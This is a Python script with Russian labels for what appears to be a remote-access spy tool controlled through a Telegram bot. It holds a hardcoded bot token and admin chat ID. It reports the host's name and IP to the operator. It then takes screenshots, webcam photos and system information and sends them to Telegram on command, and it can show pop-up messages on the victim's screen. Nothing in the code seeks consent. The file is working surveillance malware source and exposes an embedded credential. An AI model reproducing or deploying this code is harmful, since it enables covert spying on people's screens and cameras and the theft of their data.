import os
import sys
import socket
import threading
import time
import telebot
from PIL import ImageGrab
import cv2
import numpy as np
import pyautogui
import platform
import psutil
import tkinter as tk
from tkinter import messagebox
from telebot import types

TOKEN = '8077328902:AAEumOjor9A0tdEWg0wD6qEFmaOSwB8LDTY'
ADMIN_CHAT_ID = '7407115131'

# Словарь для не работоющих айпишников компьютеров (автоматически обновляется)
computers = {}
current_computer = None

bot = telebot.TeleBot(TOKEN)
is_recording_screen = False
is_recording_camera = False
video_writer = None
camera = None

def update_computers_list():
   
    global computers
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    computers = {
        ip_address: f"{hostname} (Текущий)"
    }

def show_alert(text):
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    messagebox.showwarning("Внимание!", text)
    root.destroy()

def send_computers_list():
    try:
        message = "Доступные компьютеры:\n"
        for ip, name in computers.items():
            message += f"\n🖥️ {name}\nIP: {ip}\n"
        bot.send_message(ADMIN_CHAT_ID, message)
    except Exception as e:
        print(f"Ошибка отправки списка: {e}")

def take_screenshot():
    screenshot = ImageGrab.grab()
    filename = f"screenshot_{int(time.time())}.png"
    screenshot.save(filename)
    return filename

def take_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    filename = f"photo_{int(time.time())}.png"
    cv2.imwrite(filename, frame)
    cap.release()
    return filename

def get_system_info():
    info = []
    info.append(f"💻 ОС: {platform.system()} {platform.release()}")
    info.append(f"🔢 Версия: {platform.version()}")
    info.append(f"⚡ Процессор: {platform.processor()}")
    info.append(f"🧮 Ядер: {psutil.cpu_count(logical=False)}")
    mem = psutil.virtual_memory()
    info.append(f"🧠 Память: {mem.used//(1024**3)}/{mem.total//(1024**3)} GB")
    for part in psutil.disk_partitions():
        usage = psutil.disk_usage(part.mountpoint)
        info.append(f"💾 {part.device}: {usage.used//(1024**3)}/{usage.total//(1024**3)} GB")
    return "\n".join(info)

def safe_shutdown():
    os._exit(0)

def remove_keyboard():
    return types.ReplyKeyboardRemove()

def show_start_button(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('/start'))
    bot.send_message(chat_id, "Программа остановлена. Нажмите /start для повторного запуска.", reply_markup=markup)

@bot.message_handler(commands=['start'])
def select_computer(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for ip, name in computers.items():
        markup.add(types.KeyboardButton(f"🖥️ {name} | {ip}"))
    bot.send_message(message.chat.id, "Выберите компьютер:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('🖥️'))
def handle_computer_selection(message):
    global current_computer
    try:
        ip = message.text.split('|')[-1].strip()
        current_computer = ip
        show_main_menu(message.chat.id)
    except Exception as e:
        bot.reply_to(message, f"Ошибка выбора: {e}")

def show_main_menu(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        types.KeyboardButton('Скриншот📸'),
        types.KeyboardButton('Фото🖼'),
        types.KeyboardButton('Сообщение на экран ПК📩'),
        types.KeyboardButton('Записать видео🎥'),
        types.KeyboardButton('Информация о юзере (HWID)💻'),
        types.KeyboardButton('Выключить🛑'),
        types.KeyboardButton('Сменить компьютер↩️')
    ]
    markup.add(*buttons)
    bot.send_message(chat_id, f"Управление компьютером:\nIP: {current_computer}", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == 'Сменить компьютер↩️')
def change_computer(message):
    select_computer(message)

@bot.message_handler(func=lambda m: m.text == 'Скриншот📸')
def send_screenshot(message):
    try:
        with open(take_screenshot(), 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(photo.name)
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(func=lambda m: m.text == 'Информация о юзере (HWID)💻')
def send_system_info(message):
    bot.reply_to(message, get_system_info())

@bot.message_handler(func=lambda m: m.text == 'Сообщение на экран ПК📩')
def ask_message(message):
    msg = bot.reply_to(message, "Введите текст сообщения:")
    bot.register_next_step_handler(msg, show_on_screen)

def show_on_screen(message):
    show_alert(message.text)
    bot.reply_to(message, "Сообщение показано!✅")

@bot.message_handler(func=lambda m: m.text == 'Выключить🛑')
def confirm_shutdown(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('Подтвердить✅'), types.KeyboardButton('Отмена❌'))
    bot.send_message(message.chat.id, "Вы уверены, что хотите выключить программу?", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == 'Подтвердить✅')
def shutdown(message):
    bot.send_message(message.chat.id, "Программа остановлена!", reply_markup=remove_keyboard())
    show_start_button(message.chat.id)
    threading.Thread(target=safe_shutdown).start()

@bot.message_handler(func=lambda m: m.text == 'Отмена❌')
def cancel_shutdown(message):
    show_main_menu(message.chat.id)

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    update_computers_list()
    send_computers_list()
    threading.Thread(target=run_bot, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Программа завершена")
